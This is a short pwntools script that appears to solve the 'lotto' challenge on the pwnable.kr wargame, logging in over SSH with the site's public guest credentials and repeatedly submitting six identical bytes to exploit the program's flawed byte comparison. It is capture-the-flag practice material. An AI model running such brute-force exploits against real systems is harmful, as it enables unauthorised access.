from pwn import *


context.log_level = 'debug'

host = 'pwnable.kr'
user = 'lotto'
port = 2222
password = 'guest'


def main():
    s = ssh(user, host, port, password)
    p = s.process('lotto')


    while True:
        p.recvuntil('3. Exit\n')
        p.sendline('1')
        p.recvuntil('Submit your 6 lotto bytes : ')
        p.send('\x01\x01\x01\x01\x01\x01')
        p.recvuntil('Lotto Start!\n')
        res = p.recvline()
        if res != 'bad luck...\n':
            print(res)
            p.interactive()



if __name__ == '__main__':
    main()

